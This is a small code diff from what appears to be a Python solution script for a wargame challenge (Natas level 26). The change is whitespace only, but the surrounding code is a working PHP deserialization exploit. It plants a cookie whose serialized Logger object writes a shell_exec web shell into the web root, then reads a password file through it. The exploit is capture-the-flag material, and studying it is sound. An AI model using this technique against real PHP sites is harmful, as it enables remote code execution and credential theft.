@@ -12,8 +12,8 @@ class Level_26(NatasLevel):
 
     def private_prop(_class, _name):
       return f"\x00{_class}\x00{_name}"
-    CLASS = "Logger"
-    PROPS = {
+    CLASS     = "Logger"
+    PROPS     = {
         private_prop(CLASS, "logFile"): "/var/www/natas/natas26/img/pwned2.php",
         private_prop(CLASS, "initMsg"): "",
         private_prop(CLASS, "exitMsg"): '<?php echo shell_exec("cat /etc/natas_webpass/natas27"); ?>',
@@ -23,11 +23,11 @@ class Level_26(NatasLevel):
       for k, v in PROPS.items()
     )
     serialized = f'O:{len(CLASS)}:"{CLASS}":{len(PROPS)}:{{{body}}}'
-    PAYLOAD = base64.b64encode(serialized.encode()).decode()
+    PAYLOAD    = base64.b64encode(serialized.encode()).decode()
     self.session.cookies.set("drawing", PAYLOAD)
     self.session.get(self.base_url + "/index.php")
-    resp = self.session.get(self.base_url + "/img/pwned2.php")
-    matches = re.findall(r'[a-zA-Z0-9]{32}', resp.text)
-    match = matches[-1]
+    resp       = self.session.get(self.base_url + "/img/pwned2.php")
+    matches    = re.findall(r'[a-zA-Z0-9]{32}', resp.text)
+    match      = matches[-1]
 
     return match
